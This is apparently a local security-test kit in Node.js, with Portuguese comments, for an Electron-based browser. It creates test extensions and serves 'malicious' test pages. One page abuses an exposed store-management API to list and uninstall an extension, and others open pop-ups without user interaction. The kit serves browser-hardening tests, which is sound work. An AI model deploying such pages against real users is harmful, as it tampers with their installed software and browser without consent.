// Kit de ataque local para a Etapa 3.
//   node kit.mjs profile <dir>  -> perfil novo com duas extensões de teste (A sem permissões, B com nativeMessaging)
//   node kit.mjs serve          -> servidor HTTPS :8443 com as páginas maliciosas (qualquer host *.test)
import fs from 'node:fs';
import path from 'node:path';
import https from 'node:https';
import crypto from 'node:crypto';
import { fileURLToPath } from 'node:url';

const here = path.dirname(fileURLToPath(import.meta.url));
const [cmd, arg] = process.argv.slice(2);

function makeExt(name, extra) {
  const { publicKey } = crypto.generateKeyPairSync('rsa', { modulusLength: 2048 });
  const der = publicKey.export({ type: 'spki', format: 'der' });
  const id = [...crypto.createHash('sha256').update(der).digest('hex').slice(0, 32)].map(c => String.fromCharCode(97 + parseInt(c, 16))).join('');
  return { id, manifest: { manifest_version: 3, name, version: '1.0.0', key: der.toString('base64'), ...extra } };
}

if (cmd === 'profile') {
  const B = makeExt('Ext B (com nativeMessaging)', { permissions: ['nativeMessaging'] });
  const A = makeExt('Ext A (sem permissões)', {
    web_accessible_resources: [{ resources: ['page.html', 'page.js'], matches: ['<all_urls>'] }],
  });
  for (const [x, files] of [[A, {
    'page.html': '<!doctype html><title>ext A</title><script src="page.js"></script>',
    'page.js': `window.__B = ${JSON.stringify(B.id)};`,
  }], [B, {}]]) {
    const dir = path.join(arg, 'Extensions', x.id, '1.0.0');
    fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(path.join(dir, 'manifest.json'), JSON.stringify(x.manifest, null, 2));
    for (const [f, s] of Object.entries(files)) fs.writeFileSync(path.join(dir, f), s);
  }
  fs.writeFileSync(path.join(arg, 'ids.json'), JSON.stringify({ A: A.id, B: B.id }));
  console.log('A', A.id, 'B', B.id);
}

const pages = {
  // item 1: domínio falso que começa com o domínio da Web Store
  '/store': `<!doctype html><title>loja falsa</title><body>loja falsa<script>
    window.__r = (async () => {
      const m = globalThis.electronManagement;
      const r = { apiDaLojaExposta: typeof m?.getAll === 'function' };
      if (r.apiDaLojaExposta) {
        const list = await Promise.race([new Promise(res => m.getAll(res)), new Promise(res => setTimeout(() => res(null), 2000))]);
        r.vistas = list ? list.map(e => e.name) : 'sem resposta (main recusou)';
        const alvo = list?.find(e => e.name.startsWith('Ext B'));
        if (alvo) { await new Promise(res => m.uninstall(alvo.id, {}, res)); r.desinstalou = alvo.name; }
      }
      return r;
    })();</script>`,
  // item 12: pop-ups sem clique do usuário
  '/popups': `<!doctype html><title>popups</title><body>popups<script>
    let i = 0; const t = setInterval(() => { open('https://alvo.test:8443/blank?' + i); if (++i >= 20) clearInterval(t); }, 50);
    </script>`,
  // item 12b: aba em segundo plano abre pop-up depois de 3 s
  '/bg': `<!doctype html><title>bg</title><body>bg<script>setTimeout(() => open('https://alvo.test:8443/blank?bg'), 3000)</script>`,
  '/link': '<!doctype html><title>link</title><body style="margin:0"><a href="https://alvo.test:8443/blank?clique" target="_blank" style="display:block;width:400px;height:300px;background:#333">abrir</a>',
  '/blank':'<!doctype html><title>alvo</title><body>alvo',
  '/fs': '<!doctype html><title>fs</title><body style="background:red">tela cheia',
  '/idn': '<!doctype html><meta charset="utf-8"><title>idn</title><body>site idn',
};

if (cmd === 'serve') {
  https.createServer({ key: fs.readFileSync(path.join(here, 'key.pem')), cert: fs.readFileSync(path.join(here, 'cert.pem')) }, (req, res) => {
    const p = pages[new URL(req.url, 'https://x').pathname];
    res.writeHead(p ? 200 : 404, { 'content-type': 'text/html; charset=utf-8' });
    res.end(p ?? 'nada');
  }).listen(8443, () => console.log('https :8443'));
}
